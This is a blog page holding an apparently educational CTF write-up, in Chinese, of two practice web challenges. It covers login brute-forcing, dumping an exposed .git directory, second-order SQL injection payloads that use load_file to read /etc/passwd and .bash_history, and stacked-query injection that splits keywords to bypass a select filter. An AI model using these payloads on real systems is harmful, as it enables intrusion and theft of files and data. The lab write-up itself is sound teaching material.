@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>8307和8302靶场web题wp | Damya&#39;s Blog | あややこやや</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="靶场练习">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Damya</h5>
+          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
+            
+              <span>3</span>
+            
+              <span>9</span>
+            
+              <span>7</span>
+            
+              <span>5</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>5</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DamyaHome" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>8307和8302靶场web题wp</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">8307和8302靶场web题wp</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-06-17T13:49:33.000Z" itemprop="datePublished" class="page-time">
+  2019-06-17
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-8307和8302靶场web题wp"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">8307和8302靶场web题wp</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-06-17 21:49:33" datetime="2019-06-17T13:49:33.000Z"  itemprop="datePublished">2019-06-17</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="http-47-102-141-139-8307"><a href="#http-47-102-141-139-8307" class="headerlink" title="http://47.102.141.139:8307"></a><a href="http://47.102.141.139:8307" target="_blank" rel="noopener">http://47.102.141.139:8307</a></h1><p>首先dirbuster扫一波,发现有login.php和.git目录<br>先去login.php,告诉名字是zhangwei,密码可以用brupsuite的intruder模块爆破<br>先随便输个密码sign in抓包<br><figure class="image-box">
+                <a rel=8307和8302靶场web题wp href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure><br>将包丢到intruder模块里,在position设置参数<br><figure class="image-box">
+                <a rel=8307和8302靶场web题wp href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure><br>再到payload设置爆破方式,load一个包含数字字母大小写和字符的字典,然后start attack<br><figure class="image-box">
+                <a rel=8307和8302靶场web题wp href="./3.png" title="图片" data-fancybox="images"><img src="./3.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure><br>跑得比较慢,字典比较大,因为也没有hint提示这三位是什么,只能都跑一遍了,最后跑出来是zhangwei666<br>登进去后可以正常发帖,有 title category content ,详情里还有个content<br>打开控制台有惊喜  程序员GIT写一半跑路了,都没来得及Commit :)<br>用githack跑出来半个write_do.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>用gittool工具里的Dumper和Extractor获得完整源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:/home/GitTools-master/Dumper<span class="comment"># bash gitdumper.sh http://47.102.141.139:8307/.git/ write</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span></span><br><span class="line"><span class="comment"># Only for educational purposes!</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Downloaded: HEAD</span><br><span class="line">[-] Downloaded: objects/info/packs</span><br><span class="line">[+] Downloaded: description</span><br><span class="line">[+] Downloaded: config</span><br><span class="line">[+] Downloaded: COMMIT_EDITMSG</span><br><span class="line">[+] Downloaded: index</span><br><span class="line">[-] Downloaded: packed-refs</span><br><span class="line">[+] Downloaded: refs/heads/master</span><br><span class="line">[-] Downloaded: refs/remotes/origin/HEAD</span><br><span class="line">[+] Downloaded: refs/stash</span><br><span class="line">[+] Downloaded: logs/HEAD</span><br><span class="line">[+] Downloaded: logs/refs/heads/master</span><br><span class="line">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: info/refs</span><br><span class="line">[+] Downloaded: info/exclude</span><br><span class="line">[+] Downloaded: objects/bf/bdf218902476c5c6164beedd8d2fcf593ea23b</span><br><span class="line">[+] Downloaded: objects/e5/b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">[-] Downloaded: objects/00/00000000000000000000000000000000000000</span><br><span class="line">[+] Downloaded: objects/2a/d429743f51d38f0d2cf9540ba22720cc6b2f2b</span><br><span class="line">[+] Downloaded: objects/76/9905f5a6f425ce62ed9a1cbf375a61fb56b406</span><br><span class="line">[+] Downloaded: objects/55/56e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">[+] Downloaded: objects/56/dfc20e665f434b97f34ff4dc85782ae93cf1a4</span><br><span class="line">[+] Downloaded: objects/8e/f569f235780f24c42b60f50d528a03f7238c80</span><br><span class="line"></span><br><span class="line">root@Damyayayayaya:/home/GitTools-master/Extractor<span class="comment"># ./extractor.sh ../Dumper/write/ ../Dumper/write/</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># Extractor is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span></span><br><span class="line"><span class="comment"># Only for educational purposes!</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line">[+] Found commit: bfbdf218902476c5c6164beedd8d2fcf593ea23b</span><br><span class="line">[+] Found file: /home/GitTools-master/Extractor/../Dumper/write//0-bfbdf218902476c5c6164beedd8d2fcf593ea23b/write_do.php</span><br><span class="line">[+] Found commit: e5b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">[+] Found file: /home/GitTools-master/Extractor/../Dumper/write//1-e5b2a2443c2b6d395d06960123142bc91123148c/write_do.php</span><br><span class="line">[+] Found commit: 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">[+] Found file: /home/GitTools-master/Extractor/../Dumper/write//2-5556e3ad3f21a0cf5938e26985a04ce3aa73faaf/write_do.php</span><br><span class="line"></span><br><span class="line">root@Damyayayayaya:/home/GitTools-master/Dumper/write/1-e5b2a2443c2b6d395d06960123142bc91123148c<span class="comment"># cat write_do.php</span></span><br></pre></td></tr></table></figure></p>
+<p>以下是源码,开始审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这道题要post三个变量,在发帖页面是title category content,详情页面是content,也就是说要两个content形成闭合并注释掉后面的数据,用闭合的语句来执行数据库的查询(即二次注入),要注意发帖页面的category其实是content,查询语句要在这里写<br>语句构造很容易理解,例如<br>‘, content=(select load_file(‘//etc/passwd’)),/*<br>然后留言的时候只需要闭合这个就可以执行content的语句<br>‘, content=(select load_file(‘//etc/passwd’)),/**/#<br>就可以查询到当前的系统中所有的用户和用户的主要信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash </span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin </span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin </span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin </span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync </span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin </span><br><span class="line">man:x:6:12:man:/var/<span class="keyword">cache</span>/man:/usr/sbin/nologin </span><br><span class="line">lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/<span class="keyword">var</span>/spool/lpd:/usr/sbin/nologin </span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/<span class="keyword">var</span>/mail:/usr/sbin/nologin </span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">9</span>:news:/<span class="keyword">var</span>/spool/news:/usr/sbin/nologin </span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/<span class="keyword">var</span>/spool/uucp:/usr/sbin/nologin </span><br><span class="line">proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/<span class="keyword">bin</span>:/usr/sbin/nologin </span><br><span class="line">www-<span class="keyword">data</span>:x:<span class="number">33</span>:<span class="number">33</span>:www-<span class="keyword">data</span>:/<span class="keyword">var</span>/www:/usr/sbin/nologin </span><br><span class="line"><span class="keyword">backup</span>:x:<span class="number">34</span>:<span class="number">34</span>:<span class="keyword">backup</span>:/<span class="keyword">var</span>/backups:/usr/sbin/nologin </span><br><span class="line"><span class="keyword">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="keyword">List</span> Manager:/<span class="keyword">var</span>/<span class="keyword">list</span>:/usr/sbin/nologin </span><br><span class="line">irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/<span class="keyword">var</span>/run/ircd:/usr/sbin/nologin </span><br><span class="line">gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting </span><br><span class="line"><span class="keyword">System</span> (<span class="keyword">admin</span>):/<span class="keyword">var</span>/lib/gnats:/usr/sbin/nologin </span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin </span><br><span class="line">libuuid:x:<span class="number">100</span>:<span class="number">101</span>::/<span class="keyword">var</span>/lib/libuuid: </span><br><span class="line">syslog:x:<span class="number">101</span>:<span class="number">104</span>::/home/syslog:/<span class="keyword">bin</span>/<span class="literal">false</span> </span><br><span class="line">mysql:x:<span class="number">102</span>:<span class="number">105</span>:MySQL </span><br><span class="line"><span class="keyword">Server</span>,,,:/<span class="keyword">var</span>/lib/mysql:/<span class="keyword">bin</span>/<span class="literal">false</span> </span><br><span class="line">www:x:<span class="number">500</span>:<span class="number">500</span>:www:/home/www:/<span class="keyword">bin</span>/bash</span><br></pre></td></tr></table></figure></p>
+<p>那么多伪用户都nologin,只有最后一个www用户看起来是正常的,查他的命令历史记录<br>‘, content=(select load_file(‘//home/www/.bash_history’)),/**/# </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/ unzip html.zip </span><br><span class="line">rm -f html.zip </span><br><span class="line">cp -r html /var/www/ </span><br><span class="line">cd /var/www/html/ </span><br><span class="line">rm -f .DS_Store </span><br><span class="line">service apache2 <span class="keyword">start</span></span><br></pre></td></tr></table></figure>
+<p>他在启动服务器前到/tmp/目录解压了html.zip,删除压缩包后将html移到/var/www/目录下,再把.DS_Store数据表删了,也就是说在/tmp/目录下.DS_Store数据表还在,继续查表(不加hex会显示乱码)</p>
+<p>‘,content=(select hex(load_file(‘//tmp/html/.DS_Store’))),/**/# </p>
+<p>得到一大串hex码,丢进notepad里转ascil码,得到一个  flag_8946e1ff1ee3e40f.php<br>读一下这个文件,老方法<br>‘,content=(select hex(load_file(‘//var/www/html/flag_8946e1ff1ee3e40f.php’))),/**/#<br>丢进notepad里转码,得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$flag=<span class="string">"flag&#123;wdb2018_truncation_sql_inject&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="http-47-102-141-139-8302"><a href="#http-47-102-141-139-8302" class="headerlink" title="http://47.102.141.139:8302"></a><a href="http://47.102.141.139:8302" target="_blank" rel="noopener">http://47.102.141.139:8302</a></h1><p>首先看源码,没有东西,提交后出现php数组,想到可以构造mysql语句报错查数据库<br>select databases  报错<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure></p>
+<p>过滤了很多查数据库的命令,正则/i过滤大小写,第一反应没有限制show,就用show查库<br><a href="http://47.102.141.139:8302/?inject=1&#39;;show" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;show</a> databases;#<br>‘;闭合前部分,#注释后部分,查出库名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"ctftraining"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">18</span>) <span class="string">"information_schema"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"mysql"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">18</span>) <span class="string">"performance_schema"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"supersqli"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"test"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>继续查supersqli表,出现一串数字组<br><a href="http://47.102.141.139:8302/?inject=1&#39;;show" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;show</a> tables from supersqli;#</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">16</span>) <span class="string">"1919810931114514"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"words"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>想继续用show查字段名无回显了,然后有三种办法,一是预编译slect查flag,二是alter方法修改表名直接读取flag,三是将过滤词拆分绕过select<br>我用的第三种,因为最简单而且我以前做题用到过,可以将要执行的sql语句进行拼接(也可以一句句来)，将过滤的sql关键字拆分绕过检测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.102.141.139:8302/?inject=1&apos;;use information_schema;set @sql=concat(&apos;s&apos;,&apos;elect column_name from columns wher&apos;,&apos;e table_name=&quot;1919810931114514&quot;&apos;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;--+</span><br></pre></td></tr></table></figure></p>
+<p>通过执行sql语句发现1919810931114514表当中存在flag字段<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"flag"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>直接在上一个语句的基础上构造payload<br><a href="http://47.102.141.139:8302/?inject=1&#39;;use" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;use</a> supersqli;set @sql=concat(‘s’,’elect <code>flag</code> from <code>1919810931114514</code>‘);PREPARE stmt1 FROM @sql;EXECUTE stmt1;–+<br>(预处理语句,如果查询内容不存在,会引发一个错误)<br>得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">32</span>) <span class="string">"flag&#123;glzjin_wants_a_girl_firend&#125;"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>另两种方法对着别人的wp也复现了一下</p>
+<ul>
+<li>预编译slect查flag</li>
+</ul>
